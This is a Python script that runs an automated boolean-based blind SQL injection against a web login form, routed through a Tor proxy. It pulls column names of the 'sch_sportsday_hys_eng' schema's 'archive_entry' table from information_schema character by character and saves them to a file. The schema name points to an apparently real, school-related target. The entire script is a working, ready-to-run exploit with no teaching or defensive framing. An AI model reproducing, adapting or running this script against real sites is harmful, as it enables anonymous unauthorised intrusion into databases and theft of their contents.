import time
import requests

url = "--target--"


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
alphabet = [
"_",
"e","t","a","i","n","o","s","h","r","d","l","u","c","m","f","w","y","g","p","b","v","k","q","j","x","z",
#"E","T","A","I","N","O","S","H","R","D","L","U","C","M","F","W","Y","G","P","B","V","K","Q","J","X","Z",
#"0","1","2","3","4","5","6","7","8","9"
]
#DO NOT CHANGE THIS PART

out = open("columnname.txt","w")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime+"\n")
out.close()
out = open("columnname.txt","a")

schema = "sch_sportsday_hys_eng"
tables = [
"archive_entry"
]


correct = "p"

for table in tables:
    out.write("Table: "+table+"\n")
    print("Table: "+table)
    column = 0
    isColumnFinished = False
    while True:
        char = 1
        temp = ""
        while not isColumnFinished:
            for letter in alphabet:
                injection = "a' OR IF(HEX('"+letter+"')=HEX((SELECT SUBSTRING(column_name,"+str(char)+",1) FROM information_schema.columns WHERE table_name='"+table+"' AND table_schema='"+schema+"' LIMIT 1 OFFSET "+str(column)+")),1,'a'); -- "
                response = requests.post(
                    url,
                    cookies=cookies,
                    data={
                    'input_unique_id': injection,
                    'input_pass': 'a',
                    'btn_login': 'Submit',
                    },
                    proxies=prox
                )
                #print(response.text)
                #time.sleep(0.3)
                if response.text[40]=='p':
                    print("correct, char "+str(char)+": "+letter)
                    out.write(letter)
                    temp += letter
                    char += 1
                    break
            else:
                print("column done")
                out.write("\n")
                isColumnFinished = True
        if temp=="":
            break
        column += 1
        isColumnFinished = False
        print("Column "+str(column)+": "+temp)
        print("next column")

    print("DONE")
    print("column count:"+str(column))
    print("next table")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime)